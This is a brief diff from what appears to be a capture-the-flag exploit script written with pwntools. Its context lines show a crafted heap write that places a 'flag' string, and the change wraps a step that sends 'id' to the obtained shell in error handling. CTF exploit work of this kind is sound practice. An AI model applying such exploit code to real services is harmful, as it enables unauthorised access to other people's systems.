@@ -122,11 +122,13 @@ edit(2, 0x200, flat(layout).ljust(0x100, '\0') + 'flag\0')
 
 sh.sendlineafter('choice: ', '5')
 
-
-sleep(1)
-sh.sendline("id")
-sleep(1)
-print sh.recv(timeout=5)
-sleep(10)
-sh.close
+try:
+    sleep(1)
+    sh.sendline("id")
+    sleep(1)
+    print sh.recv(timeout=5)
+    sleep(10)
+    sh.close
+except Exception as e:
+    sh.close()
 #sh.interactive()
